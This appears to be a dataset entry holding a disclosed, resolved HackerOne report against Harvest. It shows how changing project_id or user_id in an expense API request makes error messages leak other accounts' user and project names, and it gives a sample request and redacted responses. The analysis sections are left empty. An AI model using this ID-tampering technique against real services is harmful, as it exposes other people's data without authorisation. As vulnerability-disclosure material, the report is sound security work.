---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '152696'
original_report_id: '152696'
title: Leak of all project names and all user names , even across applications
weakness: Information Disclosure
team_handle: harvest
created_at: '2016-07-20T21:53:02.713Z'
disclosed_at: '2016-10-04T18:49:10.908Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 16
tags:
- hackerone
- information-disclosure
---

# Leak of all project names and all user names , even across applications

## Metadata

- HackerOne Report ID: 152696
- Weakness: Information Disclosure
- Program: harvest
- Disclosed At: 2016-10-04T18:49:10.908Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Summary
------------

All project names and user names can be leaked, even cross application.

Steps to reproduce
------------

1.  Create a new expense, this should generate a POST request like this:
 
    ```{bash}
POST /api/v2/expenses?user_id=1340164 HTTP/1.1
Host: 8888sasdf.harvestapp.com
[- snip -]

    -----------------------------114950898617589081931570033785
Content-Disposition: form-data; name="project_id"

    11298632

    [-snip-]
```

2. Now just change the `project_id` to any other id and the server will answer:

    ```{js}
{"message":"Test test is not assigned\n  to ███████████████ project"}
```

3. You can also change the `user_id` and the server will leak that one as well. We can leak `user_id = 1` and `project_id = 1` for example:

    ```{js}
{"message":"██████████ is not assigned\n  to █████ project"}
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
